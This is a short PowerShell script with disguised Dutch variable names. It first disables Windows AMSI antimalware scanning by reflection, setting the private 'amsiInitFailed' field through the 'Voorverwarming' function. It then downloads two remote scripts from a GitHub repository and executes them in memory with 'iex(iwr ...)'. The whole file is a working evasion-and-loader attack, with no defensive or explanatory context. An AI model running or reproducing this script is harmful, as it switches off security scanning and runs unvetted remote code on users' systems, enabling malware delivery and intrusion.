write-host "Loading..."

Function Voorverwarming {
    $HaalJeSpullenOp=[Ref].Assembly.GetTypes()
    ForEach($Spullekies in $HaalJeSpullenOp) {if ($Spullekies.Name -like "*iUtils") {$MandjeMetZooi=$Spullekies}}
    $EneSpulleke=$MandjeMetZooi.GetFields('NonPublic,Static')
    ForEach($Spulleke in $EneSpulleke) {if ($Spulleke.Name -like "*Failed") {$KapotSpulleke=$Spulleke}}
    $KapotSpulleke.SetValue($null,$true)
}

Voorverwarming

iex((iwr -UseBasicParsing https://raw.githubusercontent.com/justin-p/chef-vet/main/partysnacks.ps1).content)
iex((iwr -UseBasicParsing https://raw.githubusercontent.com/justin-p/chef-vet/main/frituurpan.ps1).content)
